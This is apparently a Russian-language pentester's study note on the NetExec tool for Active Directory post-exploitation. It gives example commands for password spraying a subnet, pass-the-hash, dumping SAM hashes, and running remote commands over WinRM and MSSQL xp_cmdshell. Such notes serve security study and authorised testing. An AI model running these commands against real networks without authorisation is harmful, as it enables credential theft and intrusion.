#tool #windows #AD 

> **NetExec (nxc)** — это современный инструмент постэксплуатации и lateral movement в Active Directory-среде.  
   Фактически это переработанный и расширенный наследник `CrackMapExec`

Он предназначен для массового взаимодействия с Windows-инфраструктурой через:

- SMB
- WinRM
- MSSQL
- RDP
- LDAP
- SSH (частично)

## Оглавление
- [[#Для чего используется]]
- [[#Как работает]]
- [[#Использование]]

---

## Для чего используется

- Проверки валидности учетных данных (password spraying)
- Lateral movement
- Выполнения удалённых команд
- Дампинга SAM / LSA / NTDS
- Извлечения хешей
- Проверки прав администратора
- Enumerate AD
- Взаимодействия с MSSQL
- Проверки RDP/WinRM доступа
- Массовых проверок хостов

## Как работает

Архитектурно NetExec:
1. Использует протокол (например SMB).
2. Аутентифицируется (пароль, NTLM hash, Kerberos, ticket).
3. Проверяет привилегии.
4. Выполняет действие (команду, модуль, dump и т.д.).
5. 
Под капотом — Python, [[Impacket]] и собственная логика обработки массовых целей.

Ключевая идея:
> Один инструмент — много целей — один тип действия.


##  Использование

1. Проверка логина и пароля на сети
```bash
nxc smb 192.168.1.0/24 -u user -p Password123
```

2. [[Pass-the-Hash]]
```bash
nxc smb 192.168.1.10 -u administrator -H <NTLM_HASH>
```

3. Dump SAM
```bash
nxc smb 192.168.1.10 -u admin -p pass --sam
```

4. Работа с WinRM
```bash
nxc winrm 192.168.1.10 -u user -p pass -x "ipconfig"
```

5. MSSQL
```bash
nxc mssql 192.168.1.20 -u sa -p password -x "xp_cmdshell 'whoami'"
```
